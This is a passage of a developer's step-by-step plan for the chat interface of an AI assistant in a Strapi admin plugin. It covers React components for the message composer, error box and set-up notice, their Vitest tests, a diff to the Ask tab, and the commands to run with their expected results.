    expect(stop.getAttribute('type')).toBe('button');
    expect(onSend).not.toHaveBeenCalled();
  });

  // A double click on Send: the second click must land on a button that does nothing, never on Stop.
  it('is not where Send was: a second click on Send, as in a double click, stops nothing', async () => {
    const onStop = vi.fn();
    const onSend = vi.fn();
    const view = renderInTheme(composer({ onStop, onSend }));
    await userEvent.click(send());
    view.rerender(composer({ busy: true, onStop, onSend }));
    await userEvent.click(send());
    expect(onSend).toHaveBeenCalledOnce();
    expect(onStop).not.toHaveBeenCalled();
  });
});
```

Create `test/unit/setup-notice.test.tsx`:

```tsx
// @vitest-environment jsdom
import { lightTheme } from '@strapi/design-system';
import { screen } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { describe, expect, it, vi } from 'vitest';
import { ErrorBox, NoteBox } from '../../admin/src/components/assistant/ErrorBox';
import { SetupNotice } from '../../admin/src/components/assistant/SetupNotice';
import { renderInTheme } from './render';

const cssOf = (element: Element): string => {
  const all = Array.from(document.querySelectorAll('style'))
    .map((style) => style.textContent ?? '')
    .join('\n');
  const classes = Array.from(element.classList);
  return all
    .split('}')
    .filter((rule) => classes.some((name) => rule.trimStart().startsWith(`.${name}`)))
    .map((rule) => `${rule}}`)
    .join('\n');
};

describe('SetupNotice', () => {
  it('has a title, the reason and Check again', () => {
    renderInTheme(
      <SetupNotice title="The assistant isn't set up" onCheckAgain={() => {}}>
        The assistant works with Anthropic only. AI_PROVIDER is set to openai.
      </SetupNotice>
    );
    expect(screen.getByRole('heading', { level: 2, name: "The assistant isn't set up" })).toBeTruthy();
    expect(screen.getByText('The assistant works with Anthropic only. AI_PROVIDER is set to openai.')).toBeTruthy();
    expect(screen.getByRole('button', { name: 'Check again' })).toBeTruthy();
  });

  it('asks again when Check again is pressed', async () => {
    const onCheckAgain = vi.fn();
    renderInTheme(<SetupNotice onCheckAgain={onCheckAgain}>No key.</SetupNotice>);
    await userEvent.click(screen.getByRole('button', { name: 'Check again' }));
    expect(onCheckAgain).toHaveBeenCalledOnce();
  });

  it('has no title when it is given none, and no empty heading', () => {
    renderInTheme(<SetupNotice onCheckAgain={() => {}}>Couldn't check the assistant: Forbidden</SetupNotice>);
    expect(screen.queryByRole('heading')).toBeNull();
    expect(screen.getByText("Couldn't check the assistant: Forbidden")).toBeTruthy();
  });

  it('draws a failed check in the danger colour, and the other notice in grey', () => {
    const danger = renderInTheme(
      <SetupNotice tone="danger" onCheckAgain={() => {}}>
        Failed.
      </SetupNotice>
    );
    expect(cssOf(screen.getByText('Failed.'))).toContain(`color:${lightTheme.colors.danger600}`);
    danger.unmount();
    renderInTheme(<SetupNotice onCheckAgain={() => {}}>No key.</SetupNotice>);
    expect(cssOf(screen.getByText('No key.'))).toContain(`color:${lightTheme.colors.neutral600}`);
  });
});

describe('ErrorBox and NoteBox', () => {
  it('is a red alert: the danger fill and the danger text', () => {
    renderInTheme(<ErrorBox>Anthropic is busy. Try again in a minute.</ErrorBox>);
    const text = screen.getByText('Anthropic is busy. Try again in a minute.');
    const alert = text.closest('[role="alert"]') as HTMLElement;
    expect(alert).not.toBeNull();
    expect(cssOf(alert)).toContain(`background:${lightTheme.colors.danger100}`);
    expect(cssOf(text)).toContain(`color:${lightTheme.colors.danger600}`);
    expect(text.textContent).not.toMatch(/^Error: /);
  });

  it('puts a line about how the turn ended in the same place, in grey, as a status', () => {
    renderInTheme(<NoteBox>The assistant stopped after 6 steps. Ask a narrower question.</NoteBox>);
    const text = screen.getByText('The assistant stopped after 6 steps. Ask a narrower question.');
    const status = text.closest('[role="status"]') as HTMLElement;
    expect(status).not.toBeNull();
    expect(cssOf(status)).toContain(`background:${lightTheme.colors.neutral100}`);
  });
});
```

Create `test/unit/ask-tab.test.tsx`:

```tsx
// @vitest-environment jsdom
import { screen, waitFor, within } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { AskTab } from '../../admin/src/components/assistant/AskTab';
import { AssistantProvider } from '../../admin/src/components/assistant/AssistantProvider';
import { renderInTheme } from './render';

/*
 * The Ask tab as staff meet it: the real provider, with `useChat` and the real connection adapter, over a stand-in for Strapi's fetch client
 * (the status call) and for `fetch` (the chat stream). Nothing here reaches a server or a model.
 */
const client = vi.hoisted(() => ({ get: vi.fn(), post: vi.fn(), put: vi.fn(), del: vi.fn() }));
vi.mock('@strapi/strapi/admin', () => ({ useFetchClient: () => client }));

const TOOLS = [
  { name: 'list_requests', label: 'Visit requests' },
  { name: 'inquiry_counts', label: 'Inquiry counts' },
];
const READY = { ready: true, model: 'claude-sonnet-5-5', tools: TOOLS };
const NOT_SET_UP = { ready: false, reason: 'The assistant works with Anthropic only. AI_PROVIDER is set to openai.' };

const encoder = new TextEncoder();
const event = (type: string, extra: Record<string, unknown> = {}) => ({ type, timestamp: Date.now(), threadId: 't', runId: 'r', ...extra });
/** A server-sent event stream of AG-UI events, as the server's chat route answers one. It ends after the last event. */
const stream = (events: Array<Record<string, unknown>>) =>
  new Response(
    new ReadableStream({
      start(controller) {
        for (const item of events) controller.enqueue(encoder.encode(`data: ${JSON.stringify(item)}\n\n`));
        controller.close();
      },
    }),
    { status: 200, headers: { 'Content-Type': 'text/event-stream' } }
  );
/** An answer in one text message. Each has a message ID of its own: a message with an ID the chat already has is added to that message. */
let answers = 0;
const answer = (text: string) => {
  answers += 1;
  const messageId = `answer-${answers}`;
  return [
    event('RUN_STARTED'),
    event('TEXT_MESSAGE_START', { messageId, role: 'assistant' }),
    event('TEXT_MESSAGE_CONTENT', { messageId, delta: text }),
    event('TEXT_MESSAGE_END', { messageId }),
    event('RUN_FINISHED', { finishReason: 'stop' }),
  ];
};

const world = ({ status = READY as unknown, chat = [] as Array<() => Response | Promise<Response>> } = {}) => {
  client.get.mockReset();
  client.get.mockImplementation(async (url: string) => {
    if (url === '/maison/assistant/status') {
      if (status instanceof Error) throw status;
      return { data: status };
    }
    throw new Error(`Unexpected GET ${url}`);
  });
  const scripted = [...chat];
  const fetchMock = vi.fn(async () => {
    const next = scripted.shift();
    if (!next) throw new Error('No answer was scripted for this request.');
    return next();
  });
  vi.stubGlobal('fetch', fetchMock);
  const view = renderInTheme(
    <AssistantProvider>
      <AskTab />
    </AssistantProvider>
  );
  return { fetchMock, view };
};

const box = () => screen.getByRole('textbox', { name: 'Chat message' }) as HTMLTextAreaElement;
const region = () => screen.getByRole('region', { name: 'Chat messages' });
/** The body of the request the page sent to the chat route. */
const sentBody = (fetchMock: ReturnType<typeof vi.fn>, index = 0) => JSON.parse((fetchMock.mock.calls[index] as unknown as [string, { body: string }])[1].body);

beforeEach(() => {
  localStorage.clear();
});
afterEach(() => {
  vi.unstubAllGlobals();
});

describe('before the chat', () => {
  it('shows "Checking the assistant…" with a loader, and no text box, until the status answers', async () => {
    let answerStatus: (value: unknown) => void = () => {};
    client.get.mockReset();
    client.get.mockImplementation(() => new Promise((resolve) => (answerStatus = resolve)));
    renderInTheme(
      <AssistantProvider>
        <AskTab />
      </AssistantProvider>
    );
    expect(screen.getByText('Checking the assistant…')).toBeTruthy();
    expect(screen.queryByRole('textbox')).toBeNull();
    answerStatus({ data: READY });
    expect(await screen.findByRole('textbox', { name: 'Chat message' })).toBeTruthy();
    expect(screen.queryByText('Checking the assistant…')).toBeNull();
  });

  it('shows the reason and Check again, and no text box, when the assistant is not set up', async () => {
    world({ status: NOT_SET_UP });
    expect(await screen.findByRole('heading', { name: "The assistant isn't set up" })).toBeTruthy();
    expect(screen.getByText(NOT_SET_UP.reason)).toBeTruthy();
    expect(screen.getByRole('button', { name: 'Check again' })).toBeTruthy();
    expect(screen.queryByRole('textbox')).toBeNull();
  });

  it('asks again when Check again is pressed, and shows the chat once the assistant is ready', async () => {
    world({ status: NOT_SET_UP });
    await screen.findByRole('button', { name: 'Check again' });
    client.get.mockImplementation(async () => ({ data: READY }));
    await userEvent.click(screen.getByRole('button', { name: 'Check again' }));
    expect(await screen.findByRole('textbox', { name: 'Chat message' })).toBeTruthy();
  });

  it("says the assistant could not be checked, in the server's words, when the status call fails, with Check again", async () => {
    world({ status: new Error('Forbidden') });
    expect(await screen.findByText("Couldn't check the assistant: Forbidden")).toBeTruthy();
    expect(screen.getByRole('button', { name: 'Check again' })).toBeTruthy();
    expect(screen.queryByRole('textbox')).toBeNull();
  });

  it('says so, with no chat, for an admin who has no assistant at all', () => {
    renderInTheme(<AskTab />);
    expect(screen.getByText('The assistant is not available for your role.')).toBeTruthy();
  });
});

describe('the chat area', () => {
  it('has the tools, the model and New chat in the top bar, the starters in the empty state, and the composer', async () => {
    world();
    expect(await screen.findByRole('button', { name: 'Tools (2)' })).toBeTruthy();
    expect(screen.getByText('claude-sonnet-5-5')).toBeTruthy();
    expect((screen.getByRole('button', { name: 'New chat' }) as HTMLButtonElement).disabled).toBe(true);
    expect(screen.getByText('Ask Maison')).toBeTruthy();
    expect(screen.getByRole('button', { name: 'Which visits are waiting for staff?' })).toBeTruthy();
    expect((screen.getByRole('button', { name: 'Send' }) as HTMLButtonElement).disabled).toBe(true);
  });
});

describe('a turn', () => {
  it('sends what staff typed with Enter, draws the answer as Markdown, and brings Send back', async () => {
    const table = ['| Reference | Status |', '| --- | --- |', '| APT-4821 | requested |'].join('\n');
    const { fetchMock } = world({ chat: [() => stream(answer(table))] });
    await screen.findByRole('textbox', { name: 'Chat message' });

    await userEvent.type(box(), 'Which visits are waiting?{Enter}');

    // The question is in the chat at once, and the box is empty again.
    expect(await within(region()).findByText('Which visits are waiting?')).toBeTruthy();
    expect(box().value).toBe('');
    // The answer comes as a table.
    expect(await within(region()).findByRole('table')).toBeTruthy();
    expect(within(region()).getByRole('cell', { name: 'APT-4821' })).toBeTruthy();
    // The turn is over: Stop has gone, and Send waits only for the next question.
    await waitFor(() => expect(screen.queryByRole('button', { name: 'Stop' })).toBeNull());
    expect((screen.getByRole('button', { name: 'Send' }) as HTMLButtonElement).disabled).toBe(true);
    // The request carried the question, to the assistant's chat route.
    expect(fetchMock).toHaveBeenCalledOnce();
    expect((fetchMock.mock.calls[0] as unknown as [string])[0]).toBe('/maison/assistant/chat');
    expect(sentBody(fetchMock).messages.at(-1)).toMatchObject({ role: 'user', content: 'Which visits are waiting?' });
    // The empty state has gone, and New chat works.
    expect(screen.queryByText('Ask Maison')).toBeNull();
    expect((screen.getByRole('button', { name: 'New chat' }) as HTMLButtonElement).disabled).toBe(false);
  });

  it('sends a starter as it is written, and leaves what staff typed in the box', async () => {
    const { fetchMock } = world({ chat: [() => stream(answer('Two visits wait.'))] });
    await screen.findByRole('textbox', { name: 'Chat message' });
    await userEvent.type(box(), 'A half-written question');

    await userEvent.click(screen.getByRole('button', { name: 'Which visits are waiting for staff?' }));

    expect(await within(region()).findByText('Two visits wait.')).toBeTruthy();
    expect(sentBody(fetchMock).messages.at(-1)).toMatchObject({ role: 'user', content: 'Which visits are waiting for staff?' });
    expect(box().value).toBe('A half-written question');
  });

  it('puts the focus back in the text box after a send, from a starter and from the Send button alike, so the next question can be typed', async () => {
    world({ chat: [() => stream(answer('One.')), () => stream(answer('Two.'))] });
    await screen.findByRole('textbox', { name: 'Chat message' });

    await userEvent.click(screen.getByRole('button', { name: 'Which visits are waiting for staff?' }));
    await within(region()).findByText('One.');
    expect(document.activeElement).toBe(box());

    await userEvent.type(box(), 'And the questions?');
    await userEvent.click(screen.getByRole('button', { name: 'Send' }));
    await within(region()).findByText('Two.');
    expect(document.activeElement).toBe(box());
  });

  // Radix unmounts the content of a tab that is not open, so the page keeps the chat in the provider, above the tabs.
  it('keeps the chat and what staff typed while they look at another tab, and shows both when they come back', async () => {
    const { view } = world({ chat: [() => stream(answer('Two visits wait.'))] });
    await screen.findByRole('textbox', { name: 'Chat message' });
    await userEvent.type(box(), 'Which visits are waiting?{Enter}');
    await within(region()).findByText('Two visits wait.');
    await userEvent.type(box(), 'And the questions');

    view.rerender(
      <AssistantProvider>
        <p>Another tab</p>
      </AssistantProvider>
    );
    expect(screen.queryByRole('textbox')).toBeNull();
    view.rerender(
      <AssistantProvider>
        <AskTab />
      </AssistantProvider>
    );

    expect(box().value).toBe('And the questions');
    expect(within(region()).getByText('Two visits wait.')).toBeTruthy();
  });

  it('shows a tool box for a tool call, in the order it came, closed, and opens it to the result', async () => {
    const calls = [
      event('RUN_STARTED'),
      event('TEXT_MESSAGE_START', { messageId: 'm1', role: 'assistant' }),
      event('TEXT_MESSAGE_CONTENT', { messageId: 'm1', delta: 'Let me look. ' }),
      event('TEXT_MESSAGE_END', { messageId: 'm1' }),
      event('TOOL_CALL_START', { toolCallId: 'c1', toolCallName: 'list_requests', parentMessageId: 'm1' }),
      event('TOOL_CALL_ARGS', { toolCallId: 'c1', delta: '{}' }),
      event('TOOL_CALL_END', { toolCallId: 'c1', toolCallName: 'list_requests', input: {} }),
      event('TOOL_CALL_RESULT', { toolCallId: 'c1', messageId: 'r1', content: JSON.stringify({ requests: [{ reference: 'APT-4821', note: '<customer_note>For my father.</customer_note>' }], capped: false }) }),
      event('TEXT_MESSAGE_START', { messageId: 'm2', role: 'assistant' }),
      event('TEXT_MESSAGE_CONTENT', { messageId: 'm2', delta: 'One visit waits.' }),
      event('TEXT_MESSAGE_END', { messageId: 'm2' }),
      event('RUN_FINISHED', { finishReason: 'stop' }),
    ];
    world({ chat: [() => stream(calls)] });
    await screen.findByRole('textbox', { name: 'Chat message' });

    await userEvent.type(box(), 'Which visits are waiting?{Enter}');

    const header = await within(region()).findByRole('button', { name: /Tool: list_requests/ });
    expect(header.getAttribute('aria-expanded')).toBe('false');
    await waitFor(() => expect(header.textContent).toContain('1 result'));
    await userEvent.click(header);
    const body = region().querySelector('pre') as HTMLElement;
    expect(body.textContent).toContain('"reference": "APT-4821"');
    expect(body.textContent).toContain('For my father.');
    expect(body.textContent).not.toContain('customer_note');
  });

  it('shows the error in a red alert, takes the failed question back into the box, and clears the error on the next send', async () => {
    const failed = [event('RUN_STARTED'), event('RUN_ERROR', { message: 'Anthropic is busy. Try again in a minute.', code: '529' })];
    world({ chat: [() => stream(failed), () => stream(answer('Fine.'))] });
    await screen.findByRole('textbox', { name: 'Chat message' });

    await userEvent.type(box(), 'Which visits are waiting?{Enter}');

    const alert = (await screen.findByText('Anthropic is busy. Try again in a minute.')).closest('[role="alert"]');
    expect(alert).not.toBeNull();
    // The turn that failed before anything came back leaves the chat, and its question goes back in the box.
    await waitFor(() => expect(box().value).toBe('Which visits are waiting?'));
    expect(within(region()).queryByText('Which visits are waiting?')).toBeNull();
    expect(screen.getByText('Ask Maison')).toBeTruthy();

    await userEvent.type(box(), '{Enter}');
    expect(await within(region()).findByText('Fine.')).toBeTruthy();
    expect(screen.queryByText('Anthropic is busy. Try again in a minute.')).toBeNull();
  });

  it('shows the words "New chat" on the button when the chat is too long to go on, and starts over when it is pressed', async () => {
    const tooLong = [event('RUN_STARTED'), event('RUN_ERROR', { message: 'This chat is long. Start a new chat.', code: 'chat_too_long' })];
    world({ chat: [() => stream(answer('Hello.')), () => stream(tooLong)] });
    await screen.findByRole('textbox', { name: 'Chat message' });
    await userEvent.type(box(), 'First{Enter}');
    await within(region()).findByText('Hello.');
    await userEvent.type(box(), 'Second{Enter}');

    await screen.findByText('This chat is long. Start a new chat.');
    const newChat = screen.getByRole('button', { name: 'New chat' });
    expect(newChat.textContent).toBe('New chat');

    await userEvent.click(newChat);
    expect(screen.queryByText('This chat is long. Start a new chat.')).toBeNull();
    expect(screen.getByText('Ask Maison')).toBeTruthy();
    expect(screen.getByRole('button', { name: 'New chat' }).textContent).toBe('');
  });

  it('stops an answer that is on its way with Stop, keeps what came, and shows no error', async () => {
    let started: () => void = () => {};
    const began = new Promise<void>((resolve) => (started = resolve));
    const slow = (signal?: AbortSignal) =>
      new Response(
        new ReadableStream({
          start(controller) {
            for (const item of answer('Looking into it').slice(0, 3)) controller.enqueue(encoder.encode(`data: ${JSON.stringify(item)}\n\n`));
            started();
            signal?.addEventListener('abort', () => controller.error(new DOMException('The operation was aborted.', 'AbortError')));
          },
        }),
        { status: 200, headers: { 'Content-Type': 'text/event-stream' } }
      );
    world();
    vi.stubGlobal('fetch', vi.fn(async (_url: string, init?: { signal?: AbortSignal }) => slow(init?.signal)));
    await screen.findByRole('textbox', { name: 'Chat message' });

    await userEvent.type(box(), 'Which visits are waiting?{Enter}');
    await began;
    expect(await within(region()).findByText('Looking into it')).toBeTruthy();
    await userEvent.click(await screen.findByRole('button', { name: 'Stop' }));

    await waitFor(() => expect(screen.queryByRole('button', { name: 'Stop' })).toBeNull());
    expect(within(region()).getByText('Looking into it')).toBeTruthy();
    // The design system's own live region is an empty alert, so what is looked for is an alert with words in it.
    expect(Array.from(document.querySelectorAll('[role="alert"]')).filter((alert) => alert.textContent)).toEqual([]);
  });
});
```

- [ ] **Step 2: Run them to see them fail**

Run: `npm test -- test/unit/composer.test.tsx test/unit/setup-notice.test.tsx test/unit/ask-tab.test.tsx`
Expected: FAIL, `Test Files  3 failed (3)` and `Tests  11 failed | 3 passed (14)`. `Composer`, `ErrorBox` and `SetupNotice` do not exist, and the tab still draws the old text box, whose name is "Your message" and not "Chat message".

- [ ] **Step 3: Write the composer, the error box and the set-up notice**

`Composer.tsx` is the reference's `InputArea` and form, with Maison's `Textarea` and key rule, and two buttons: Send is size `L` with the Sparkle icon, Stop is size `L`, `danger-light`, with the Cross icon. Stop has `type="button"`: inside the form, a submit button would send the draft instead of stopping the answer. `ErrorBox.tsx` is the reference's red box with Maison's text, and the grey `NoteBox`. `SetupNotice.tsx` is the reference's `SetupNotice` with Check again.

Create `admin/src/components/assistant/Composer.tsx`:

```tsx
import { useLayoutEffect, type ChangeEvent, type KeyboardEvent, type RefObject } from 'react';

import { Box, Button, Textarea } from '@strapi/design-system';
import { Cross, Sparkle } from '@strapi/icons';
import styled from 'styled-components';

import { canSend, composerButtons, shouldSendOnKey } from '../../assistant';

/**
 * The composer, copied from strapi-plugin-tanstack-ai 1.6.0 (`ChatInput.tsx`): one row with a line on top, the text box on the left and
 * the buttons on the right. Send is size L with the Sparkle icon. Stop is size L, `danger-light`, with the Cross icon, and sits beside Send
 * while an answer comes.
 *
 * What differs from the reference, on purpose:
 * - The text box is a multi-line `Textarea`: it starts as one line and grows to six, because staff write several lines and Japanese.
 *   Enter sends, Shift+Enter adds a line, and the Enter that confirms a conversion sends nothing (`shouldSendOnKey`).
 * - Send and Stop are two buttons, not one in the same place. A double click on Send lands on a switched-off Send and never on Stop.
 * - The text box stays usable while an answer comes, so the next question can be typed. Only Send waits.
 */
const InputArea = styled.div`
  display: flex;
  gap: 8px;
  align-items: flex-end;
  padding: 16px;
  border-top: 1px solid ${({ theme }) => theme.colors.neutral200};
`;

interface ComposerProps {
  /** What staff have typed and not sent. It lives in the provider, so it is still there when staff come back from another tab. */
  draft: string;
  onDraft: (text: string) => void;
  /** Whether an answer is on its way. */
  busy: boolean;
  /** Whether the assistant is set up. */
  ready: boolean;
  /** Send was pressed, or Enter: staff want to send `draft`. Only called when a send would work. */
  onSend: (text: string) => void;
  onStop: () => void;
  /** The text box, so the page can put the focus back in it after a send. */
  textareaRef: RefObject<HTMLTextAreaElement>;
}

export const Composer = ({ draft, onDraft, busy, ready, onSend, onStop, textareaRef }: ComposerProps) => {
  const buttons = composerButtons({ text: draft, busy, ready });

  // The box is one line tall at first and grows with what is typed. The CSS caps it at six lines, and it scrolls beyond that.
  useLayoutEffect(() => {
    const box = textareaRef.current;
    if (!box) return;
    box.style.height = 'auto';
    box.style.height = `${box.scrollHeight}px`;
  }, [draft, textareaRef]);

  const submit = () => {
    if (canSend({ text: draft, busy, ready })) onSend(draft);
  };

  return (
    <form
      onSubmit={(event) => {
        event.preventDefault();
        submit();
      }}
    >
      <InputArea>
        <Box flex="1">
          <Textarea
            ref={textareaRef}
            aria-label="Chat message"
            placeholder="Type your message..."
            rows={1}
            minHeight="4rem"
            maxHeight="13.6rem"
            paddingTop={2}
            paddingBottom={2}
            resizable={false}
            value={draft}
            onChange={(event: ChangeEvent<HTMLTextAreaElement>) => onDraft(event.target.value)}
            onKeyDown={(event: KeyboardEvent<HTMLTextAreaElement>) => {
              // React's synthetic event has no isComposing: it is on the native event. preventDefault runs before the check, so Enter with
              // nothing to send adds no line break either.
              if (shouldSendOnKey({ key: event.key, shiftKey: event.shiftKey, isComposing: event.nativeEvent.isComposing, keyCode: event.keyCode })) {
                event.preventDefault();
                submit();
              }
            }}
          />
        </Box>
        {/* Two buttons with their own keys. type="button" on Stop: inside the form, a submit button would send the draft instead of stopping the answer. */}
        <Button key="send" type="submit" size="L" startIcon={<Sparkle />} disabled={buttons.sendDisabled}>
          Send
        </Button>
        {buttons.showStop && (
          <Button key="stop" type="button" variant="danger-light" size="L" startIcon={<Cross />} onClick={onStop}>
            Stop
          </Button>
        )}
      </InputArea>
    </form>
  );
};
```

Create `admin/src/components/assistant/ErrorBox.tsx`:

```tsx
import type { ReactNode } from 'react';

import { Box, Typography } from '@strapi/design-system';

/**
 * The red box between the messages and the composer, copied from strapi-plugin-tanstack-ai 1.6.0 (`ChatPanel.tsx`): 12px padding, the
 * `danger100` fill, 16px side margins and `danger600` text. It is an alert, so a screen reader reads it when it appears. Its text is
 * Maison's own (`errorNotice`), without the reference's "Error: " in front.
 */
export const ErrorBox = ({ children }: { children: ReactNode }) => (
  <Box role="alert" padding={3} background="danger100" marginLeft={4} marginRight={4}>
    <Typography textColor="danger600">{children}</Typography>
  </Box>
);

/** The same place and shape in grey, for a line about how the last turn ended (the assistant stopped after 6 steps, or declined). It is a status, not an alert. */
export const NoteBox = ({ children }: { children: ReactNode }) => (
  <Box role="status" padding={3} background="neutral100" marginLeft={4} marginRight={4}>
    <Typography textColor="neutral600">{children}</Typography>
  </Box>
);
```

Create `admin/src/components/assistant/SetupNotice.tsx`:

```tsx
import type { ReactNode } from 'react';

import { Box, Button, Typography } from '@strapi/design-system';

/**
 * What the Ask tab shows instead of the chat when the assistant is not set up, or its status could not be read, copied from
 * strapi-plugin-tanstack-ai 1.6.0 (`SetupNotice` in `HomePage.tsx`): a white box with a title and a sentence. Maison's has Check again, which
 * asks the server once more, since staff set the key and restart Strapi without leaving the page. There is no text box in either case.
 */
export const SetupNotice = ({ title, tone = 'neutral', children, onCheckAgain }: { title?: string; tone?: 'neutral' | 'danger'; children: ReactNode; onCheckAgain: () => void }) => (
  <Box background="neutral0" hasRadius shadow="tableShadow" padding={8}>
    {title && (
      <Typography variant="delta" tag="h2">
        {title}
      </Typography>
    )}
    <Box paddingTop={title ? 3 : 0}>
      <Typography textColor={tone === 'danger' ? 'danger600' : 'neutral600'}>{children}</Typography>
    </Box>
    <Box paddingTop={4}>
      <Button size="S" variant="secondary" onClick={onCheckAgain}>
        Check again
      </Button>
    </Box>
  </Box>
);
```

- [ ] **Step 4: Join the pieces in the Ask tab**

`AskTab.tsx`: the tab's states and the provider's API are as they were. It now draws the set-up notice for a failed check and for an assistant that is not set up, the `Loader` while the status loads, and, for a ready assistant, the chat area with the message list, the red box, the grey note and the composer. The old text box, Send and Stop buttons and error text are gone, and so are the `Box`, `Button`, `Flex` and `Textarea` imports they needed.

```diff
@@
 import * as React from 'react';
 
-import { Box, Button, Flex, Textarea, Typography } from '@strapi/design-system';
+import { Loader, Typography } from '@strapi/design-system';
 
-import { askTabState, canSend, composerButtons, shouldSendOnKey, type MessageSource } from '../../assistant';
+import { askTabState, canSend, type MessageSource } from '../../assistant';
+import { useAssistant } from './AssistantProvider';
 import { ChatArea } from './ChatArea';
+import { Composer } from './Composer';
+import { ErrorBox, NoteBox } from './ErrorBox';
 import { MessageList } from './MessageList';
-import { useAssistant } from './AssistantProvider';
+import { SetupNotice } from './SetupNotice';
 
 /**
  * The Ask tab: a chat for staff about requests, questions and inquiries. The chat itself, and the text staff have typed and not
@@
 
   const state = askTabState(assistant.status, assistant.statusError);
 
-  if (state.kind === 'loading') return <Typography textColor="neutral600">Checking the assistant…</Typography>;
+  if (state.kind === 'loading') return <Loader small>Checking the assistant…</Loader>;
 
-  if (state.kind === 'failed' || state.kind === 'not-ready') {
+  if (state.kind === 'failed') {
     return (
-      <Box background={state.kind === 'failed' ? 'danger100' : 'neutral0'} borderColor={state.kind === 'failed' ? 'danger200' : 'neutral150'} padding={6} hasRadius>
-        <Flex direction="column" alignItems="flex-start" gap={3}>
-          <Typography textColor={state.kind === 'failed' ? 'danger700' : 'neutral800'}>{state.text}</Typography>
-          <Button size="S" variant="secondary" onClick={() => void assistant.recheck()}>
-            Check again
-          </Button>
-        </Flex>
-      </Box>
+      <SetupNotice tone="danger" onCheckAgain={() => void assistant.recheck()}>
+        {state.text}
+      </SetupNotice>
+    );
+  }
+
+  if (state.kind === 'not-ready') {
+    return (
+      <SetupNotice title="The assistant isn't set up" onCheckAgain={() => void assistant.recheck()}>
+        {state.text}
+      </SetupNotice>
     );
   }
 
   const { busy, ready, notice, note, draft } = assistant;
-  const buttons = composerButtons({ text: draft, busy, ready });
 
-  const submit = (message: string, source: MessageSource) => {
+  const send = (message: string, source: MessageSource) => {
     if (!canSend({ text: message, busy, ready })) return;
     void assistant.send(message, source);
     // A starter's button goes when the chat starts, and a clicked Send is switched off while the answer comes: the text box keeps the focus.
@@
       newChatOffered={notice?.newChat === true}
       onNewChat={assistant.newChat}
     >
-      <MessageList messages={assistant.messages} busy={busy} onStarter={(starter) => submit(starter, 'starter')} canStart={(starter) => canSend({ text: starter, busy, ready })} />
-
-      <Flex direction="column" alignItems="stretch" gap={3} padding={4}>
-        {notice && (
-          <Typography role="alert" textColor="danger600">
-            {notice.text}
-          </Typography>
-        )}
-        {note && (
-          <Typography role="status" textColor="neutral600">
-            {note}
-          </Typography>
-        )}
-        <Textarea
-          ref={box}
-          aria-label="Your message"
-          placeholder="Ask about requests, questions or inquiries"
-          value={draft}
-          onChange={(event: React.ChangeEvent<HTMLTextAreaElement>) => assistant.setDraft(event.target.value)}
-          onKeyDown={(event: React.KeyboardEvent<HTMLTextAreaElement>) => {
-            // Enter sends. Shift+Enter adds a line break. Enter that confirms a Japanese conversion is not a send.
-            // React's synthetic event has no isComposing: it is on the native event.
-            if (shouldSendOnKey({ key: event.key, shiftKey: event.shiftKey, isComposing: event.nativeEvent.isComposing, keyCode: event.keyCode })) {
-              event.preventDefault();
-              submit(draft, 'box');
-            }
-          }}
-        />
-        <Flex gap={2}>
-          {/* Send and Stop are two buttons side by side, each with its own key: a second click on Send, as in a double click, lands on a switched-off Send and never on Stop. */}
-          <Button key="send" disabled={buttons.sendDisabled} onClick={() => submit(draft, 'box')}>
-            Send
-          </Button>
-          {buttons.showStop && (
-            <Button key="stop" variant="secondary" onClick={assistant.stop}>
-              Stop
-            </Button>
-          )}
-        </Flex>
-      </Flex>
+      <MessageList messages={assistant.messages} busy={busy} onStarter={(starter) => send(starter, 'starter')} canStart={(starter) => canSend({ text: starter, busy, ready })} />
+      {notice && <ErrorBox>{notice.text}</ErrorBox>}
+      {note && <NoteBox>{note}</NoteBox>}
+      <Composer draft={draft} onDraft={assistant.setDraft} busy={busy} ready={ready} onSend={(text) => send(text, 'box')} onStop={assistant.stop} textareaRef={box} />
     </ChatArea>
   );
 };
```

- [ ] **Step 5: Run the tests, then everything**

Run: `npm test -- test/unit/composer.test.tsx test/unit/setup-notice.test.tsx test/unit/ask-tab.test.tsx`
Expected: PASS, `Test Files  3 passed (3)` and `Tests  40 passed (40)`.

Run: `npm test`
Expected: PASS, `Test Files  107 passed (107)` and `Tests  3035 passed (3035)`.

Run: `npm run test:ts:back` and `npm run test:ts:front`
Expected: both finish with no error output.

Run: `rm -rf dist && npm run build`
Expected: it ends with `Build complete!`.

Run: `node scripts/check-esm-import.mjs`
Expected: exit 0, with one `ok` line for each of `dist/server/index.js` and `dist/server/index.mjs` saying there is no static load of `@tanstack/ai`.

Run: `node ../../../scripts/share-strapi-utils.mjs --check`
Expected: `Maison and oauth-mcp-manager share Strapi core's @strapi/utils.`

- [ ] **Step 6: (Paul) Look at it in the browser**

Skip this step and say so in the report. Paul runs it with the checklist in Task 8: the text box starts one line tall and grows to six lines, then scrolls; Enter, Shift+Enter and Japanese conversion; Send and Stop side by side; the red box and the "New chat" words; the set-up notice with Check again.

- [ ] **Step 7: Prove the tests can fail**

Make each change, run the files named, see them fail, and undo the change.

In `Composer.tsx`, send on every Enter: replace the `shouldSendOnKey(...)` condition with `event.key === 'Enter'`.

Run: `npm test -- test/unit/composer.test.tsx`
Expected: FAIL, among others: `Enter > adds a line break and sends nothing with Shift`; `Enter > sends nothing while an input method composes: the Enter that confirms a conversion is not a send`; `Enter > sends nothing for keyCode 229, which Safari reports for the Enter that ends a composition after it has stopped composing`.

In `Composer.tsx`, never switch Send off: `disabled={false}`.

Run: `npm test -- test/unit/composer.test.tsx`
Expected: FAIL, among others: `Send > is switched off, and sends nothing, when the box is empty`; `Send > is switched off, and sends nothing, when the box has only spaces`; `Send > is switched off, and sends nothing, when an answer is on its way`.

In `Composer.tsx`, make Stop a submit button: `type="submit"`.

Run: `npm test -- test/unit/composer.test.tsx`
Expected: FAIL, among others: `Stop > shows beside Send while an answer comes, and stops it`.

In `Composer.tsx`, let the box grow past six lines: `maxHeight="40rem"`.

Run: `npm test -- test/unit/composer.test.tsx`
Expected: FAIL, among others: `the text box > is one line tall at least and six lines tall at most, and stays that size: the staff cannot drag it`.

In `ErrorBox.tsx`, make the red box a status: `role="status"`.

Run: `npm test -- test/unit/setup-notice.test.tsx`
Expected: FAIL, among others: `ErrorBox and NoteBox > is a red alert: the danger fill and the danger text`.

In `AskTab.tsx`, do not show the error: delete the line `{notice && <ErrorBox>{notice.text}</ErrorBox>}`.

Run: `npm test -- test/unit/ask-tab.test.tsx`
